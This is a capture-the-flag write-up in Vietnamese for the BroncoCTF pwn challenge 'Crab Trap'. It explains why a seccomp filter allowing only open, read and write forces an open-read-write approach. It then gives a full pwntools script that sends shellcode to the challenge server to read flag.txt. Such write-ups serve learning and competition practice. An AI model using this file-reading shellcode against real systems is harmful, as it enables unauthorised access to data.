Giải đấu: BroncoCTF

Tên bài: Crab Trap

Mảng: Pwn

Mô tả: Mr. Krabs has heard about these so-called "shellcode hackers" trying to break into his secret vault. So he hired the barnacles.

They said no execve. Something about a "Strict Sea Policy."

You'll need to get creative if you want that flag.

Dạng flag: bronco{...}

* [Script khai thác (crab_trap.py)](./crab_trap.py)

__1. PHÂN TÍCH__

Sau khi chạy 2 đường dẫn bên dưới thì mình có thể khẳng định ngay đây là kiểu bài ``Blackbox``

``sc broncoctf-crab-trap.chals.io``

<img width="1390" height="512" alt="image" src="https://github.com/user-attachments/assets/5efc2705-1c54-49a2-b3b8-6a66c498f432" />

``nc 0.cloud.chals.io 34381``

<img width="777" height="410" alt="image" src="https://github.com/user-attachments/assets/2eb8744c-630d-40ba-9b80-18cfac605b9c" />

__-> Chương trình cho dữ liệu đầu vào tối đa là 512 bytes và banner của server đã ghi rõ __``Allowed syscalls: open, read, write``__ -> Áp dụng kĩ thuật ``ORW (Open - Read - Write)``__

__-> Lời cảnh báo về ``execve`` cũng đã khẳng định không thể sử dụng cách thông thường là tạo một shell (/bin/sh) để lấy flag__

__KẾ HOẠCH TẤN CÔNG__

__Với việc thư viện pwntools có lệnh ``Shellcraft`` sẽ giúp cho chúng ta tạo nên những đoạn code ASM một cách đơn giản cũng như là chính xác__

__``shellcode = shellcraft.open('flag.txt') `` -> Thực thi mở tệp tin mục tiêu và nhận về một file descriptor__

__``shellcode += shellcraft.read('rax', 'rsp', 100)`` -> Sử dụng file descriptor đó để sao chép dữ liệu từ tệp tin vào vùng nhớ__

__``shellcode += shellcraft.write(1, 'rsp', 100)`` -> Gửi nội dung đã sao chép từ vùng nhớ ra thiết bị xuất chuẩn để có thể đọc được flag__

__2. THỰC HIỆN TẤN CÔNG (VIẾT PAYLOAD HOÀN CHỈNH)__

```python
from pwn import *

context.arch = 'amd64'
host = '0.cloud.chals.io'
port = 34381
io = remote(host, port)

shellcode = shellcraft.open('flag.txt') 

shellcode += shellcraft.read('rax', 'rsp', 100)
shellcode += shellcraft.write(1, 'rsp', 100)
payload = asm(shellcode)

print(f"[*] Payload đã tạo, độ dài: {len(payload)} bytes")
io.recvuntil(b'> ')
io.send(payload)

print("[*] Phản hồi từ server:")
print(io.recvall().decode(errors='ignore'))
```

